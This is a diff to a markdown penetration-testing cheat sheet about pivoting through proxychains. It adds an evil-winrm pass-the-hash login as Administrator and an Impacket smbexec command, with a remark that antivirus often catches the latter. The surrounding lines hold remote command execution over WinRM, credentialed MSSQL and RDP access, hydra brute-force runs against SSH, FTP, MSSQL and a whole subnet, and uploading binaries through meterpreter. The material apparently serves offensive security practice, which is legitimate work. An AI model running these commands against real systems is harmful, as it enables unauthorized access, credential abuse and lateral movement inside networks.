@@ -56,17 +56,24 @@ Only -sT will work - can be a bit slow with an SSH tunnel so setting up a Chisel
 ### Use WinRM through proxychains         
 
     proxychains crackmapexec winrm 10.10.10.10 -u "USERNAME" -p "PASSWORD" -x "command"    
-### MSSQL     
+    proxychains evil-winrm -u Administrator -H 'hash' -i 10.10.10.10    #pass the hash         
+### MSSQL Access Through Proxychains       
  
     proxychains sqsh -S 172.16.1.5 -U user -P password    
 ### RDP through ProxyChains       
 
     proxychains xfreerdp /u:DOMAIN\\username /p:password /v:ip      
+### SMBExec Through Proxychains      
+Using Impacket SMBexec.py script - often caught by AV so be careful        
+
+    proxychains4 -q smbexec.py test/admin:test@192.168.1.10         
+    
 ### Brute Force a Service Through Proxychains    
 
     proxychains hydra 10.10.10.10 ssh -s 22 -L users.txt -P passwords.txt -t 4     
     proxychains hydra -L usernames -P passwords 10.10.10.0/24 ftp       #brute force a subnet   
     proxychains hydra -L users –P passwords <IP> mssql   #MSSQL    
+    
 ## Uploading Static Binaries    
 Use static binaries from [here](https://github.com/ernw/static-toolbox) or [here](https://github.com/andrew-d/static-binaries)     
 Upload nmap binary to a Windows target (through meterpreter and scan)      
